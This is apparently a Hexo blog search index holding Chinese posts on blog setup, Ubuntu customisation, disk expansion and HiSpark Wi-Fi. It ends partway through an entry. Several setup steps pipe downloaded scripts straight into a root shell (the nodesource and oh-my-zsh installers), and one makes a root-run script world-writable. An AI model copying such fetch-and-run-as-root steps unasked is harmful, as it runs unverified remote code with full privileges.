<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>bolg_remake</title>
      <link href="/2021/10/30/bolg-remake/"/>
      <url>/2021/10/30/bolg-remake/</url>
      
        <content type="html"><![CDATA[<p>之前是jekyll+nexT配置的博客，后来看到https://blog.bxhong.cn/，就换用hexo+butterfly了</p><span id="more"></span><h2 id="必要的环境">必要的环境</h2><ul><li>node</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo apt updatesudo apt upgradecurl -sL https:&#x2F;&#x2F;deb.nodesource.com&#x2F;setup_16.x | sudo -E bash -sudo apt-get install -y nodejsnode -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>npm</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo apt install -y npmsudo npm install -g nsudo n stablenpm -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>git</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo apt install gitgit -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>Hexo</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">npm install -g hexo-clinpm install hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="搭建">搭建</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mkdir ~&#x2F;webcd ~&#x2F;webhexo init myblogcd myblognpm installgit clone -b master https:&#x2F;&#x2F;github.com&#x2F;jerryc127&#x2F;hexo-theme-butterfly.git themes&#x2F;butterfly<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>_config.yml</p><pre class="line-numbers language-none"><code class="language-none">deploy:  type: &#39;git&#39;  repo:    github: git@github.com:AmorFati-coder&#x2F;AmorFati-coder.github.io.git  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>详细参数参考<a href="https://butterfly.js.org/posts/21cfbf15/">Doc</a></p><h2 id="github上传">github上传</h2><blockquote><p>详细的步骤不说，主要注意两点</p></blockquote><ul><li>_config  <pre class="line-numbers language-yml" data-language="yml"><code class="language-yml"><span class="token key atrule">deploy</span><span class="token punctuation">:</span>  <span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">'git'</span>  <span class="token key atrule">repo</span><span class="token punctuation">:</span>    <span class="token key atrule">github</span><span class="token punctuation">:</span> git@github.com<span class="token punctuation">:</span>AmorFati<span class="token punctuation">-</span>coder/AmorFati<span class="token punctuation">-</span>coder.github.io.git //这里一定要写ssh的链接，否则就得频繁输入account和token  <span class="token key atrule">branch</span><span class="token punctuation">:</span> master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>本地ssh的生成，github ssh的配置</li></ul><h2 id="域名的绑定">域名的绑定</h2><ul><li>云服务商DNS添加CNAME记录</li><li><code>touch themes/butterfly/source/CNAME</code>添加域名</li><li>page选项添加域名</li></ul><h2 id="常用命令">常用命令</h2><ul><li><code>hexo s</code>本地运行&amp;调试</li><li><code>hexo g</code>编译md文件，生成public目录</li><li><code>hexo clean</code>删除public目录</li><li><code>hexo g -d</code>上传</li><li><code>hexo new page 'name'</code>新的子页面</li><li><code>hexo new 'name'</code> 新的文章</li></ul><h2 id="其他">其他</h2><ul><li>其实也可以编译html，不过注意作用范围</li></ul>]]></content>
      
      
      <categories>
          
          <category> Essays </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
            <tag> Hexo </tag>
            
            <tag> Butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu美化过程</title>
      <link href="/2021/10/28/2021-10-28-Ubuntu_remake/"/>
      <url>/2021/10/28/2021-10-28-Ubuntu_remake/</url>
      
        <content type="html"><![CDATA[<center>在删除分区，没有备份所有配置文件之后</center><span id="more"></span><h2 id="准备">准备</h2><ul><li>VMware</li><li><a href="https://ubuntu.com/download">ubuntu镜像</a></li></ul><h2 id="配置">配置</h2><blockquote><p>懒得写脚本了</p></blockquote><h3 id="修改镜像源">修改镜像源</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">amorfati@ubuntu:~$ lsb_release -aNo LSB modules are available.Distributor ID:UbuntuDescription:Ubuntu 20.04.3 LTSRelease:20.04Codename:focalamorfati@ubuntu:~$ sudo cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list.bakamorfati@ubuntu:~$ sudo gedit &#x2F;etc&#x2F;apt&#x2F;sources.list&#x2F;&#x2F;注意focalamorfati@ubuntu:~$ cat &#x2F;etc&#x2F;apt&#x2F;sources.listdeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-security main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-security main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-updates main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-updates main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-proposed main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-proposed main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-backports main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; focal-backports main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="安装一些工具">安装一些工具</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">amorfati@ubuntu:~$ sudo suroot@ubuntu:&#x2F;home&#x2F;amorfati# apt update &amp;&amp; apt upgraderoot@ubuntu:&#x2F;home&#x2F;amorfati# apt install vim&#x2F;&#x2F;磁盘root@ubuntu:&#x2F;home&#x2F;amorfati# apt install gparted&#x2F;&#x2F;查看系统信息root@ubuntu:&#x2F;home&#x2F;amorfati# apt install neofetchroot@ubuntu:&#x2F;home&#x2F;amorfati# apt-get install language-pack-zh-hansroot@ubuntu:&#x2F;home&#x2F;amorfati# apt install ibus-clutterroot@ubuntu:&#x2F;home&#x2F;amorfati# apt install gitroot@ubuntu:&#x2F;home&#x2F;amorfati# apt install gnome-tweaks chrome-gnome-shellroot@ubuntu:&#x2F;home&#x2F;amorfati# apt install gtk2-engines-murrine gtk2-engines-pixbuf root@ubuntu:&#x2F;home&#x2F;amorfati# apt install sassc optipng inkscape libcanberra-gtk-module libglib2.0-dev libxml2-utils<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="桌面配置">桌面配置</h2><blockquote><p>除了插件，均在tweak中修改</p></blockquote><ul><li><p>访问<a href="root@ubuntu:/home/amorfati#">gnome插件</a></p><ul><li>dash to panel</li><li>user themes</li><li>Exrension List</li><li>Desktop icons<ul><li>隐藏</li></ul></li><li>Clipboard Indicator</li></ul></li><li><p>修改背景</p><ul><li><code>/usr/share/backgroud/</code></li></ul></li><li><p><a href="https://www.gnome-look.org/p/1357889">修改主题</a></p><ul><li>解压至<code>/usr/share/themes</code>or<code>~/.themes</code></li></ul></li><li><p><a href="https://www.gnome-look.org/p/1356095">修改游标</a> <a href="https://www.gnome-look.org/p/1359276">修改图标</a></p><ul><li><code>/usr/share/icons</code></li></ul></li><li><p>修改登录背景</p><ul><li><a href="https://github.com/thiggy01/change-gdm-background/blob/master/change-gdm-background">脚本</a></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@ubuntu:&#x2F;home&#x2F;amorfati# cat demo.sh#!&#x2F;usr&#x2F;bin&#x2F;env bash# Autor: Thiago Silva# Contact: thiagos.dasilva@gmail.com# URL: https:&#x2F;&#x2F;github.com&#x2F;thiggy01&#x2F;change-gdm-background# &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; ## Check if script is run by root.if [ &quot;$(id -u)&quot; -ne 0 ] ; then    echo &#39;This script must be run as root or with the sudo command.&#39;    exit 1fi# Check what linux distro is being used.distro&#x3D;&quot;$(lsb_release -c | cut -f 2)&quot;if ! [[ &quot;$distro&quot; &#x3D;~ (focal|groovy|hirsute) ]]; then    echo &#39;Sorry, this script only works with focal, groovy or hirsute distros.&#39;    exit 1fi# Check if glib 2.0 development libraries are installed.if [ ! -x &quot;$(command -v glib-compile-resources)&quot; ]; then    echo &#39;Additional glib 2.0 libraries need to be installed.&#39;    read -p &#39;Type y or Y to proceed. Any other key to exit: &#39; -n 1    if [[ &quot;$REPLY&quot; &#x3D;~ ^[yY]$ ]]; thenapt install libglib2.0-dev-bin    elseecho &quot;This tool can&#39;t run without required libraries&quot;echo &quot;Exiting.&quot;echoexit 1    fifi# Assign the default gdm theme file path.if [ &quot;$(lsb_release -i | awk &#39;&#123;print $3&#125;&#39;)&quot; &#x3D;&#x3D; &#39;Ubuntu&#39; ]; then    gdm3Resource&#x3D;&#x2F;usr&#x2F;share&#x2F;gnome-shell&#x2F;theme&#x2F;Yaru&#x2F;gnome-shell-theme.gresourceelif [ &quot;$(lsb_release -i | awk &#39;&#123;print $3&#125;&#39;)&quot; &#x3D;&#x3D; &#39;Pop&#39; ]; then    gdm3Resource&#x3D;&#x2F;usr&#x2F;share&#x2F;gnome-shell&#x2F;theme&#x2F;Pop&#x2F;gnome-shell-theme.gresourcefi# Create a backup file of the original theme if there isn&#39;t one.[ ! -f &quot;$gdm3Resource&quot;~ ] &amp;&amp; cp &quot;$gdm3Resource&quot; &quot;$gdm3Resource~&quot;# Restore backup function.restore () &#123;mv &quot;$gdm3Resource~&quot; &quot;$gdm3Resource&quot;if [ &quot;$?&quot; -eq 0 ]; then    chmod 644 &quot;$gdm3Resource&quot;    echo &#39;GDM background sucessfully restored.&#39;    read -p &#39;Do you want to restart gdm to apply change? (y&#x2F;n):&#39; -n 1echoif [[ &quot;$REPLY&quot; &#x3D;~ ^[yY]$ ]]; then    service gdm restartelse    echo &#39;Restart GDM service to apply change.&#39;    exit 0fifi&#125;# Restore the original gdm3 theme.[ &quot;$1&quot; &#x3D;&#x3D; &quot;--restore&quot; ] &amp;&amp; restore#Define main variables.gdm3xml&#x3D;$(basename &quot;$gdm3Resource&quot;).xmlworkDir&#x3D;&quot;&#x2F;tmp&#x2F;gdm3-theme&quot;# Create directories from resource list.CreateDirs() &#123;for resource in &#96;gresource list &quot;$gdm3Resource~&quot;&#96;; do    resource&#x3D;&quot;$&#123;resource#\&#x2F;org\&#x2F;gnome\&#x2F;shell\&#x2F;&#125;&quot;    if [ ! -d &quot;$workDir&quot;&#x2F;&quot;$&#123;resource%&#x2F;*&#125;&quot; ]; then      mkdir -p &quot;$workDir&quot;&#x2F;&quot;$&#123;resource%&#x2F;*&#125;&quot;    fidone&#125;# Extract resources from binary file.ExtractRes() &#123;for resource in &#96;gresource list &quot;$gdm3Resource~&quot;&#96;; do    gresource extract &quot;$gdm3Resource~&quot; &quot;$resource&quot; &gt; \    &quot;$workDir&quot;&#x2F;&quot;$&#123;resource#\&#x2F;org\&#x2F;gnome\&#x2F;shell\&#x2F;&#125;&quot;done&#125;# Compile resources into a gresource binary file.CompileRes() &#123;glib-compile-resources --sourcedir&#x3D;$workDir&#x2F;theme&#x2F; $workDir&#x2F;theme&#x2F;&quot;$gdm3xml&quot;&#125;# Moves the newly created resource to its default place.MoveRes() &#123;mv $workDir&#x2F;theme&#x2F;gnome-shell-theme.gresource $gdm3Resource&#125;# Check if gresource was sucessfuly moved to its default folder.Check() &#123;if [ &quot;$?&quot; -eq 0 ]; then# Solve a permission change issue (thanks to @huepf from github).    chmod 644 &quot;$gdm3Resource&quot;    echo &#39;GDM background sucessfully changed.&#39;    read -p &#39;Do you want to restart gdm to apply change? (y&#x2F;n):&#39; -n 1    echo    # If change was successful apply ask for gdm restart.    if [[ &quot;$REPLY&quot; &#x3D;~ ^[yY]$ ]]; thenservice gdm restart    elseecho &quot;Change will be applied only after restarting gdm&quot;echo    fielse    # If something went wrong, restore backup file.    echo &#39;something went wrong.&#39;    restore    echo &#39;No changes were applied.&#39;fi&#125;CleanUp() &#123;    # Remove temporary directories and files.    rm -r &quot;$workDir&quot;    exit 0&#125;# Test if argument is an image file.if [[ $(file --mime-type -b &quot;$1&quot;) &#x3D;&#x3D; image&#x2F;*g ]]; then    # Define image variables.    gdmBgImg&#x3D;$(realpath &quot;$1&quot;)    imgFile&#x3D;$(basename &quot;$gdmBgImg&quot;)    # Call procedures to create directories and extract resources to them.    CreateDirs    ExtractRes    # Copy selected image to the resources directory.    cp &quot;$gdmBgImg&quot; &quot;$workDir&quot;&#x2F;theme    # Change gdm background to the image you submited.    oldBg&#x3D;&quot;#lockDialogGroup \&#123;.*?\&#125;&quot;    newBg&#x3D;&quot;#lockDialogGroup &#123;background: url(&#39;resource:\&#x2F;\&#x2F;\&#x2F;org\&#x2F;gnome\&#x2F;shell\&#x2F;theme\&#x2F;$imgFile&#39;);background-size: cover; &#125;&quot;    perl -i -0777 -pe &quot;s&#x2F;$oldBg&#x2F;$newBg&#x2F;s&quot; &quot;$workDir&quot;&#x2F;theme&#x2F;gdm3.css    # Generate gresource xml file.    echo &#39;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;gresources&gt;    &lt;gresource prefix&#x3D;&quot;&#x2F;org&#x2F;gnome&#x2F;shell&#x2F;theme&quot;&gt;&#39; &gt; &quot;$workDir&quot;&#x2F;theme&#x2F;&quot;$gdm3xml&quot;    for file in &#96;gresource list &quot;$gdm3Resource~&quot;&#96;; doecho &quot;        &lt;file&gt;$&#123;file#\&#x2F;org\&#x2F;gnome&#x2F;shell\&#x2F;theme\&#x2F;&#125;&lt;&#x2F;file&gt;&quot; \&gt;&gt; &quot;$workDir&quot;&#x2F;theme&#x2F;&quot;$gdm3xml&quot;    done    echo &quot;        &lt;file&gt;$imgFile&lt;&#x2F;file&gt;&quot; &gt;&gt; &quot;$workDir&quot;&#x2F;theme&#x2F;&quot;$gdm3xml&quot;    echo &#39;    &lt;&#x2F;gresource&gt;&lt;&#x2F;gresources&gt;&#39; &gt;&gt; &quot;$workDir&quot;&#x2F;theme&#x2F;&quot;$gdm3xml&quot;    # Compile the new gresource.    CompileRes    # Move gresource to the default place.    MoveRes    # Check if everything was successful.    Check    # Remove temporary files and exit.    CleanUp# Change background colors.elif [[ &quot;$1&quot; &#x3D;~ ^#([A-Fa-f0-9]&#123;6&#125;|[A-Fa-f0-9]&#123;3&#125;)$ ]]; then    # Store selected background color.    BgColor&#x3D;&quot;$1&quot;    CreateDirs    ExtractRes    # Change gdm background to the color you submited.    oldBg&#x3D;&quot;#lockDialogGroup \&#123;.*?\&#125;&quot;    newBg&#x3D;&quot;#lockDialogGroup &#123;background: $BgColor;background-size: cover; &#125;&quot;    perl -i -0777 -pe &quot;s&#x2F;$oldBg&#x2F;$newBg&#x2F;s&quot; &quot;$workDir&quot;&#x2F;theme&#x2F;gdm3.css    # Generate the gresource xml file.    echo &#39;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;gresources&gt;    &lt;gresource prefix&#x3D;&quot;&#x2F;org&#x2F;gnome&#x2F;shell&#x2F;theme&quot;&gt;&#39; &gt; &quot;$workDir&quot;&#x2F;theme&#x2F;&quot;$gdm3xml&quot;    for file in &#96;gresource list &quot;$gdm3Resource~&quot;&#96;; doecho &quot;        &lt;file&gt;$&#123;file#\&#x2F;org\&#x2F;gnome&#x2F;shell\&#x2F;theme\&#x2F;&#125;&lt;&#x2F;file&gt;&quot; \&gt;&gt; &quot;$workDir&quot;&#x2F;theme&#x2F;&quot;$gdm3xml&quot;    done    echo &#39;    &lt;&#x2F;gresource&gt;&lt;&#x2F;gresources&gt;&#39; &gt;&gt; &quot;$workDir&quot;&#x2F;theme&#x2F;&quot;$gdm3xml&quot;    # Compile the new gresource.    CompileRes    # Move gresource to the default place.    MoveRes    # Remove temporary files and exit.    CleanUpelse    # If no file was submited or file submited isn&#39;t an image,    # show this message.    echo &#39;Image file not found or wrong color hex code.&#39;    echo &#39;Please, submit a .jpg or .png image file or a valid hex code.&#39;    echo &#39;Usage: sudo .&#x2F;ubuntu-20.04-change-gdm-background &#x2F;path&#x2F;to&#x2F;image.*g&#39;    echo &#39;Usage: sudo .&#x2F;ubuntu-20.04-change-gdm-background \#yourhexcode&#39;firoot@ubuntu:&#x2F;home&#x2F;amorfati# chmod 777 demo.shroot@ubuntu:&#x2F;home&#x2F;amorfati# .&#x2F;demo.sh &#x2F;usr&#x2F;share&#x2F;backgrounds&#x2F;696016.jpg <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Shell配置">Shell配置</h2></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@ubuntu:&#x2F;home&#x2F;amorfati# apt install zshroot@ubuntu:&#x2F;home&#x2F;amorfati# chsh -s &#x2F;bin&#x2F;zshroot@ubuntu:&#x2F;home&#x2F;amorfati# wget https:&#x2F;&#x2F;github.com&#x2F;robbyrussell&#x2F;oh-my-zsh&#x2F;raw&#x2F;master&#x2F;tools&#x2F;install.sh -O - | shroot@ubuntu:&#x2F;home&#x2F;amorfati# vim &#x2F;root&#x2F;.zshrcZSH_THEME&#x3D;&quot;ys&quot;amorfati@ubuntu:~$ wget https:&#x2F;&#x2F;github.com&#x2F;robbyrussell&#x2F;oh-my-zsh&#x2F;raw&#x2F;master&#x2F;tools&#x2F;install.sh -O - | sh➜  ~ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;romkatv&#x2F;powerlevel10k.git $&#123;ZSH_CUSTOM:-$HOME&#x2F;.oh-my-zsh&#x2F;custom&#125;&#x2F;themes&#x2F;powerlevel10k➜  ~ vim ~&#x2F;.zshrcZSH_THEME&#x3D;&quot;powerlevel10k&#x2F;powerlevel10k&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 磁盘拓展</title>
      <link href="/2021/10/27/2021-10-27-Ubuntu-%E7%A3%81%E7%9B%98%E6%8B%93%E5%B1%95/"/>
      <url>/2021/10/27/2021-10-27-Ubuntu-%E7%A3%81%E7%9B%98%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<center>之前记录过deepin的磁盘拓展，发现更便捷的方式</center><span id="more"></span><h2 id="gparted">gparted</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"> ~  screenfetch                                              127 err  20:30:19                           .&#x2F;+o+-       amorfati@ubuntu                  yyyyy- -yyyyyy+      OS: Ubuntu 18.04 bionic               :&#x2F;&#x2F;+&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;-yyyyyyo      Kernel: x86_64 Linux 5.4.0-87-generic           .++ .:&#x2F;++++++&#x2F;-.+sss&#x2F;&#96;      Uptime: 3m         .:++o:  &#x2F;++++++++&#x2F;:--:&#x2F;-      Packages: 1866        o:+o+:++.&#96;..&#96;&#96;&#96;.-&#x2F;oo+++++&#x2F;     Shell: zsh 5.4.2       .:+o:+o&#x2F;.          &#96;+sssoo+&#x2F;    Resolution: 1920x1080  .++&#x2F;+:+oo+o:&#96;             &#x2F;sssooo.   DE: GNOME  &#x2F;+++&#x2F;&#x2F;+:&#96;oo+o               &#x2F;::--:.   WM: GNOME Shell \+&#x2F;+o+++&#96;o++o               ++&#x2F;&#x2F;&#x2F;&#x2F;.   WM Theme:   .++.o+++oo+:&#96;             &#x2F;dddhhh.   GTK Theme: Fluent-round-dark [GTK2&#x2F;3]       .+.o+oo:.          &#96;oddhhhh+    Icon Theme: McMojave-circle        \+.++o+o&#96;&#96;-&#96;&#96;&#96;&#96;.:ohdhhhhh+     Font: Ubuntu 11         &#96;:o+++ &#96;ohhhhhhhhyo++os:      CPU: Intel Core i5-10210U @ 2x 2.112GHz           .o:&#96;.syhhhhhhh&#x2F;.oo++o&#96;      GPU: svgadrmfb               &#x2F;osyyyyyyo++ooo+++&#x2F;     RAM: 903MiB &#x2F; 5187MiB                   &#96;&#96;&#96;&#96;&#96; +oo+++o\:                              &#96;oo++.                            ~ sudo apt install gparted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> disk </tag>
            
        </tags>
      
    </entry>
    
    
    
    
    
    <entry>
      <title>Pegsus和Taurus的无线互联问题</title>
      <link href="/2021/09/06/2021-09-07-Pegsus%E5%92%8CTaurus%E7%9A%84%E6%97%A0%E7%BA%BF%E4%BA%92%E8%81%94%E9%97%AE%E9%A2%98/"/>
      <url>/2021/09/06/2021-09-07-Pegsus%E5%92%8CTaurus%E7%9A%84%E6%97%A0%E7%BA%BF%E4%BA%92%E8%81%94%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>刚开始的话，主要看几个重要的函数就完事了(自己的C++确实学的稀烂)</p><span id="more"></span><h2 id="T板的热点">T板的热点</h2><ul><li>切换到hiopenais框架下的build目录</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">make rebuildmake boards_rebuild<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>把编译生成的文件，复制到sdk下的hiopenais下</p><pre class="line-numbers language-none"><code class="language-none">cp -rf .&#x2F;output&#x2F;* .&#x2F;sdk&#x2F;hi3516dv300&#x2F;osdrv&#x2F;pub&#x2F;rootfs_glibc&#x2F;hiopenais&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>改系统配置文件hiopenais.conf</p><blockquote><p>因为taurus.so和higo.so两个编译好的文件都需要调用LCD屏，注释一个，上面的strm_saver我也关掉了</p></blockquote><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">; plug#序号只是在conf中区分不同的plug，序号可以不连续，但最大不超过10，hiopenais会枚举plug0~plug9[work_exts]plug0 &#x3D; &quot;exts&#x2F;wifi.so&quot;                   ; ap热点;plug1 &#x3D; &quot;exts&#x2F;taurus.so&quot;        ; LCDplug2 &#x3D; &quot;exts&#x2F;rtsp_agent.so&quot;   ; RTSPplug3 &#x3D; &quot;exts&#x2F;histreaming.so&quot;  ; histreamingplug4 &#x3D; &quot;exts&#x2F;ircutservice.so&quot; ; ircutplug5 &#x3D; &quot;exts&#x2F;higo.so&quot;         ; UI[app]pre_start_vio &#x3D; true ; 预先启动vi&#x2F;vo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>制作文件系统，烧录</p></li></ul><h2 id="P板的连接">P板的连接</h2><blockquote><p>几个重要函数的调用</p></blockquote><h3 id="极简版">极简版</h3><ul><li>修改SSID的宏定义<code>#define CONFIG_AP_SSID  &quot;HiSpark_XXXXX&quot;</code></li></ul><h3 id="简略版">简略版</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;hi_wifi_api.h&gt;&#x2F;*初始化*&#x2F;hi_wifi_init()&#x2F;*开启sta*&#x2F;hi_wifi_start_sta()&#x2F;*扫描热点*&#x2F;hi_wifi_sta_scan()&#x2F;*连接*&#x2F; StaStartConnect()-&gt; hi_wifi_sta_connect()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="详细版">详细版</h3><p><a href="https://blog.csdn.net/aa120515692/article/details/110087044">Hi3861 WiFi操作，热点连接</a></p>]]></content>
      
      
      <categories>
          
          <category> Harmony </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HiSpark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电工电子实验</title>
      <link href="/2021/08/30/2021-08-30-%E7%94%B5%E5%B7%A5%E7%94%B5%E5%AD%90%E5%AE%9E%E9%AA%8C/"/>
      <url>/2021/08/30/2021-08-30-%E7%94%B5%E5%B7%A5%E7%94%B5%E5%AD%90%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<center>需要在网络内容的基础上自行修改，没有来源的参照已有链接，或者一些流传的pdf文件(这里不提供)</center><span id="more"></span><h2 id="三相异步电路的基本启停电路">三相异步电路的基本启停电路</h2><ul><li><a href="http://mfk.yeah2.com/?doc/d4e4680812661ed9ad51f01dc281e53a59025159.html">主要内容来源1</a></li><li><a href="https://zhidao.baidu.com/question/433709706.html">主要内容来源2</a></li><li><a href="https://wenku.baidu.com/view/d4e4680812661ed9ad51f01dc281e53a59025159.html">主要内容来源3</a></li><li><a href="https://www.diangon.com/m284001.html">辅助</a></li><li><a href="https://baike.baidu.com/item/%E8%87%AA%E9%94%81%E4%BA%92%E9%94%81/2340463">保护作用</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Hardware </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电工电子 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具类</title>
      <link href="/2021/08/26/2021-8-26-%E5%B7%A5%E5%85%B7%E7%B1%BB/"/>
      <url>/2021/08/26/2021-8-26-%E5%B7%A5%E5%85%B7%E7%B1%BB/</url>
      
